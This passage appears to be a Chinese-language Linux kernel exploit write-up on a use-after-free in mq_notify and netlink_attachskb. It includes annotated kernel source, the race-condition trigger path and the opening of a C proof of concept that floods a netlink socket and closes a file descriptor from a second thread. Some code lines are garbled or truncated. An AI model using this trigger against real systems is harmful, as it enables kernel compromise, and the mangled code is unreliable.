@@ -1,0 +1,236 @@
+            if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf ||
+                 test_bit(NETLINK_CONGESTED, &nlk->state)) &&
+                !sock_flag(sk, SOCK_DEAD))
+                *timeo = schedule_timeout(*timeo);
+                    /*设置当前task状态为TASK_RUNNING*/
+            __set_current_state(TASK_RUNNING);
+                    /*移除等待队列*/
+            remove_wait_queue(&nlk->wait, &wait);
+            sock_put(sk);/*sock对象的引用计数器-1，此时加减平衡*/
+            if (signal_pending(current)) {
+                kfree_skb(skb);
+                return sock_intr_errno(*timeo);
+            }
+            return 1;
+        }
+        netlink_skb_set_owner_r(skb, sk);
+        return 0;
+    }
+    ---------------------------------CUT LINE--------------------------------------------------------------    static void netlink_skb_set_owner_r(struct sk_buff *skb, struct sock *sk)
+    {
+        WARN_ON(skb->sk != NULL);
+        skb->sk = sk;
+        skb->destructor = netlink_skb_destructor;
+        atomic_add(skb->truesize, &sk->sk_rmem_alloc);
+        sk_mem_charge(sk, skb->truesize);
+    }
+详细的代码分析以注释在上面。  
+关于mq_notify():
+  * 参数：
+  * mqdes：消息队列描述符
+  * notification：（1）not null:表示消息到达，且先前队列为空（2）null：表示撤销已注册的通知
+  * 通知方式：
+  * 产生一个信号
+  * 创建一个线程执行一个函数
+通过分析上面的代码可知，mq_notify()有如下几条路径：
+  * u_notification 为空时：调用remove_notification()撤销已注册通知
+  * u_notification 不为空：判断通知类型：(1)SIGV_THREAD:申请内存空间并将用户空间通知拷贝到内核（nc）->将nc压入sock队列中-->获取对应的fd->从fd对应的filp中获取对应的sock对象->将数据包与sock相关联->根据返回值选择continue/goto retry/goto out->goto retry:如果close这个file，那么将会直接goto out，此时sock不为空，会执行netlink_datachskb(),导致uaf。
+  * 还有中间过程出错直接goto out的路径就不写了
+### 如何触发漏洞
+根据patch可知，ret==1 时触发漏洞，ret是netlink_attachskb的返回值。  
+分析一下mq_notify系统调用执行到netlink_attachskb的条件：
+  * u_notification ！= NULL
+  * notification.sigev_notify = SIGEV_THREAD
+  * notification.sigev_value.sival_ptr 必须有效
+  * notification.sigev_signo 提供一个有效的文件描述符
+这样就到达了 netlink_attachskb函数  
+再来详细分析一下这个函数（已经在上面代码中给出），看一下漏洞触发的路径，以及经历了哪些判断：  
+1，
+根据代码可知，下面这个条件必须为真，首先对sk->sk_rmem_alloc跟sk->sk_rcvbuf进行了判断，如果判断不通过，则直接执行netlink_set_owner_r函数
+    if ((atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf ||
+             test_bit(NETLINK_CONGESTED, &nlk->state)) &&
+            !netlink_skb_is_mmaped(skb))
+sk_rmem_alloc可以视为sk缓冲区的当前大小，sk_rcvbuf是sk的理论大小，因为sk_rmem_alloc有等于0的情况，因此sk_rcvbuf可能需要0的值，因此通过更改sk_rcvbuf不是最好的解决方案，因此看一下sk_rmem_alloc.
+    val = min_t(u32, val, sysctl_rmem_max);
+    set_rcvbuf:
+            sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
+            sk->sk_rcvbuf = max_t(u32, val * 2, SOCK_MIN_RCVBUF);
+分析前面代码可以注意到，通过skb_set_owner_r可以更改sk_rmem_alloc的值,调用链如下：  
+`netlink_sendmsg->netlink_unicast->netlink_attachskb->netlink_skb_owner_r`  
+netlink_sendmsg可以在用户空间通过调用sendmsg实现调用  
+因此首先分析netlink_sendmsg函数：
+    static int netlink_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
+    {
+        struct sock *sk = sock->sk;
+        struct netlink_sock *nlk = nlk_sk(sk);
+        DECLARE_SOCKADDR(struct sockaddr_nl *, addr, msg->msg_name);
+        u32 dst_portid;
+        u32 dst_group;
+        struct sk_buff *skb;
+        int err;
+        struct scm_cookie scm;
+        u32 netlink_skb_flags = 0;
+        if (msg->msg_flags&MSG_OOB)
+            return -EOPNOTSUPP;
+        err = scm_send(sock, msg, &scm, true);
+        if (err msg_namelen) {
+            err = -EINVAL;
+            if (addr->nl_family != AF_NETLINK)
+                goto out;
+            dst_portid = addr->nl_pid;
+            dst_group = ffs(addr->nl_groups);
+            err =  -EPERM;
+            if ((dst_group || dst_portid) &&
+                !netlink_allowed(sock, NL_CFG_F_NONROOT_SEND))
+                goto out;
+            netlink_skb_flags |= NETLINK_SKB_DST;
+        } else {
+            dst_portid = nlk->dst_portid;
+            dst_group = nlk->dst_group;
+        }
+        if (!nlk->portid) {
+            err = netlink_autobind(sock);
+            if (err)
+                goto out;
+        }
+        /* It's a really convoluted way for userland to ask for mmaped
+         * sendmsg(), but that's what we've got...
+         */
+        if (netlink_tx_is_mmaped(sk) &&
+            msg->msg_iter.type == ITER_IOVEC &&
+            msg->msg_iter.nr_segs == 1 &&
+            msg->msg_iter.iov->iov_base == NULL) {
+            err = netlink_mmap_sendmsg(sk, msg, dst_portid, dst_group,
+                           &scm);
+            goto out;
+        }
+        err = -EMSGSIZE;
+        if (len > sk->sk_sndbuf - 32)
+            goto out;
+        err = -ENOBUFS;
+        skb = netlink_alloc_large_skb(len, dst_group);
+        if (skb == NULL)
+            goto out;
+        NETLINK_CB(skb).portid  = nlk->portid;
+        NETLINK_CB(skb).dst_group = dst_group;
+        NETLINK_CB(skb).creds   = scm.creds;
+        NETLINK_CB(skb).flags   = netlink_skb_flags;
+        err = -EFAULT;
+        if (memcpy_from_msg(skb_put(skb, len), msg, len)) {
+            kfree_skb(skb);
+            goto out;
+        }
+        err = security_netlink_send(sk, skb);
+        if (err) {
+            kfree_skb(skb);
+            goto out;
+        }
+        if (dst_group) {
+            atomic_inc(&skb->users);
+            netlink_broadcast(sk, skb, dst_portid, dst_group, GFP_KERNEL);
+        }
+        err = netlink_unicast(sk, skb, dst_portid, msg->msg_flags&MSG_DONTWAIT);
+    out:
+        scm_destroy(&scm);
+        return err;
+    }
+如果想要执行netlink_unicast函数，则需要满足以下条件：
+  * msg->msg_flags != MSG_OOB
+  * scm()返回值 = 0，分析scm_send函数可知，只需要 msg->msg_controllen msg_namelen 不为空 , nl_family = AF_NETLINK
+  * 传入的参数 len sk_sndbuf - 32)
+这样就可以执行netlink_unicast()，这里面基本没有我们的可控参数，可以直接执行netlink_attachskb(),结合上面的代码可知，当sk_rmem_alloc
+sk != NULL);
+        skb->sk = sk;
+        skb->destructor = netlink_skb_destructor;
+        atomic_add(skb->truesize, &sk->sk_rmem_alloc);
+        sk_mem_charge(sk, skb->truesize);
+    }
+这样每次都可以增加sk_rmem_alloc的值。
+进入这个判断以后，当前的线程被加入wait队列中，timeo肯定不为
+NULL，所以当前线程状态被设置为task_interruptible，然后cpu调度进入block状态，等待被唤醒然后顺序执行,signal_pending
+检查是否有序号需要被处理，返回值=0，表示没有信号。然后返回1，
+#### 触发漏洞
+前面已经知道了如何让 ret = 1,这里会继续执行retry，通过fd获取filp......，但是如果filp = NULL，就会进入out label
+    out:
+        if (sock)
+            netlink_detachskb(sock, nc);
+        else if (nc)
+            dev_kfree_skb(nc);
+此时的sock不为空，但是netlink_detachskb对其减1，如果等于0，则free。  
+再次回到mq_notify主逻辑，看一下函数对sock的操作：
+  * netlink_getsockbyfilp->sock_hold() ： sk->refcnt += 1
+  * netlink_attachskb -> sk_put() : sk->refcnt -= 1
+正常逻辑下：根据fd获取到sock结构，此时sock的引用加1，然后进入attachskb函数，判断此时的sk是不是“满了”，如果“满了”，则sock的引用减1，然后继续尝试获取sock，当sock还有剩余空间的时候，把skb跟sock绑定。这样一来，sock的引用，一加一减，保持平衡。但是如果有两个线程，thread1在还没进入retry的时候，thread2把file关闭了，也就是说此时filp为NULL，thread1将进入out
+label，但是sock不为NULL，因此，sock的refcnt将会减1，但是在退出程序时，内核会将分配的对象释放掉，最终会调用`sock->ops->release()`,但是sock已经在前面被我们释放掉了，如果这块内存又被我们申请回来，并写入其他数据控制程序流，导致uaf，就可以执行任意代码。
+### 编写poc
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #define MAX_MSGSIZE 1024
+    #define SOL_NETLINK (270)
+    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
+    struct state
+    {
+        int ok;
+        int fd;
+        int close_fd;
+    }state;
+    int add_rmem_alloc(void){
+        int fd1 = -1;
+        int fd2 = -1;
+        fd1 = socket(AF_NETLINK,SOCK_RAW,2);
+        fd2 = socket(AF_NETLINK,SOCK_DGRAM,2);
+        struct sockaddr_nl nladdr;
+        nladdr.nl_family = AF_NETLINK;
+        nladdr.nl_groups = 0;
+        nladdr.nl_pad = 0;
+        nladdr.nl_pid = 10;
+        bind(fd1,(struct sockaddr*)&nladdr,sizeof(struct sockaddr_nl));
+        struct msghdr msg;
+        struct sockaddr_nl r_nladdr;
+        r_nladdr.nl_pad = 0;
+        r_nladdr.nl_pid = 10;
+        r_nladdr.nl_family = AF_NETLINK;
+        r_nladdr.nl_groups = 0;
+        memset(&msg,0,sizeof(msg));
+        msg.msg_name = &r_nladdr; /*address of receiver*/
+        msg.msg_namelen = sizeof(nladdr);
+        /* message head */
+        char buffer[] = "An example message";
+        struct nlmsghdr *nlhdr;
+        nlhdr = (struct nlmsghdr*)malloc(NLMSG_SPACE(MAX_MSGSIZE));
+        strcpy(NLMSG_DATA(nlhdr),buffer);
+        nlhdr->nlmsg_len = NLMSG_LENGTH(strlen(buffer));/*nlmsghdr len + data len*/
+        nlhdr->nlmsg_pid = getpid();  /* self pid */
+        nlhdr->nlmsg_flags = 0;
+        struct iovec iov;
+        iov.iov_base = nlhdr;
+        iov.iov_len = nlhdr->nlmsg_len;
+        msg.msg_iov = &iov;
+        msg.msg_iovlen = 1;
+        while (sendmsg(fd2, &msg, MSG_DONTWAIT)>0) ;
+        if (errno != EAGAIN)
+        {
+            perror("sendmsg");
+            exit(-5);
+        }
+        printf("[*] sk_rmem_alloc > sk_rcvbuf ==> ok\n");
+        return fd1;
+        return 0;    
+    }
+    static void *thread2(struct state *s){
+        int fd = s->fd;
+        s->ok = 1;
+        sleep(3);
+        close(s->close_fd);
